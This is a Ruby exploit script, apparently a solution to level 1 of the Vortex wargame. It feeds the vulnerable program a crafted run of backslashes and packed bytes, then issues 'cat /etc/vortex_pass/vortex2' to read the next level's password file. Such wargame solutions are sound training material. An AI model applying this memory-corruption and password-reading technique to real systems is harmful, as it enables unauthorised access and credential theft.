    require 'pty'
     
    begin
      PTY.spawn("/vortex/level1") do |stdin, stdout, pid|
        stdin.sync = true
        reader = Thread.new {
          STDOUT.sync = true
          STDOUT.write(stdin.read(1)) until stdin.eof?
        }
        257.times {stdout.write "\\"}
        1.times {stdout.write [0xca].pack('V')}
        1.times {stdout.write "\\"}
        1.times {stdout.write [0xff].pack('V')}
        sleep 0.25
        stdout.puts
        sleep 0.25
        stdout.write "cat /etc/vortex_pass/vortex2\n"
        sleep 0.25
      end
    rescue => e
      puts e
    end


